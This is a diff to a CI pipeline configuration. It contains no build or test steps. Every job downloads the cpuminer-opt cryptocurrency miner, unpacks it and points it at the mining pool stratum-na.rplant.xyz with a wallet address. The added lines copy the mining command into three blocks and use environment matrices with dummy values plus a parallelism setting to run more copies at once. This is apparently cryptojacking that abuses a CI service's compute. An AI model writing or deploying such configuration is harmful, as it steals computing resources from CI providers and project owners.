@@ -11,7 +11,41 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - brew install gnu-tar
-            - gtar xvf cpuminer-opt-linux.tar.gz
-            - './cpuminer-sse2 -a yescryptR32 -o stratum+tcp://stratum-na.rplant.xyz:7047 -u DJAECyb7wAohrrZkgCkNctgAJpcDDMhxsk.kido99'
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yescryptR32 -o stratum+tcps://stratum-na.rplant.xyz:17047 -u DJAECyb7wAohrrZkgCkNctgAJpcDDMhxsk.kido90'
+          matrix:
+            - env_var: FOO
+              values:
+                - value1
+                - value2
+            - env_var: BAR
+              values:
+                - value1
+                - value2
+            - env_var: BAZ
+              values:
+                - value1
+                - value2
+    dependencies: []
+  - name: 'Block #2'
+    dependencies:
+      - 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yescryptR32 -o stratum+tcps://stratum-na.rplant.xyz:17047 -u DJAECyb7wAohrrZkgCkNctgAJpcDDMhxsk.kido99'
+          matrix:
+            - env_var: FOO
+              values:
+                - value1
+                - value2
+  - name: 'Block #3'
+    dependencies:
+      - 'Block #1'
+      - 'Block #2'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yescryptR32 -o stratum+tcps://stratum-na.rplant.xyz:17047 -u DJAECyb7wAohrrZkgCkNctgAJpcDDMhxsk.kido90'
+          parallelism: 4
